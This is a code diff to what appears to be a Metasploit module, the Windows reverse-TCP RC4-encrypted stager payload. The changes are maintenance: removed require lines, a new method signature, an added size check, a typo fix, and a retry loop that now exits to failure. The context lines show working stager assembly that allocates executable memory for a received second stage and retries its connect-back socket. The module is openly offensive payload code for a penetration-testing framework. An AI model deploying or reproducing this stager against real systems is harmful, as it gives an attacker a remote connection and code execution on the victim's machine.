@@ -1,10 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/reverse_tcp'
-require 'msf/core/payload/windows/rc4'
-
 module Msf
 
 ###
@@ -22,7 +17,7 @@ module Payload::Windows::ReverseTcpRc4
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
     conf = {
       port:        datastore['LPORT'],
@@ -34,7 +29,7 @@ module Payload::Windows::ReverseTcpRc4
     }
 
     # Generate the advanced stager if we have space
-    if self.available_space && required_space <= self.available_space
+    if self.available_space && cached_size && required_space <= self.available_space
       conf[:exitfunk] = datastore['EXITFUNC']
       conf[:reliable] = true
     end
@@ -61,7 +56,7 @@ module Payload::Windows::ReverseTcpRc4
   #
   # Generate an assembly stub with the configured feature set and options.
   #
-  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [Integer] :port The port to connect to
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
@@ -95,7 +90,7 @@ module Payload::Windows::ReverseTcpRc4
           lea ecx, [esi+0x100]  ; ECX = stage length + S-box length (alloc length)
         push  0x40         ; PAGE_EXECUTE_READWRITE
         push 0x1000            ; MEM_COMMIT
-      ; push esi               ; push the newly recieved second stage length.
+      ; push esi               ; push the newly received second stage length.
           push ecx             ; push the alloc length
         push 0                 ; NULL as we dont care where the allocation is.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
@@ -142,7 +137,8 @@ module Payload::Windows::ReverseTcpRc4
         dec [esp]               ; decrement the counter
 
         ; try again
-        jmp create_socket
+        jnz create_socket
+        jmp failure
       ^
     end
 
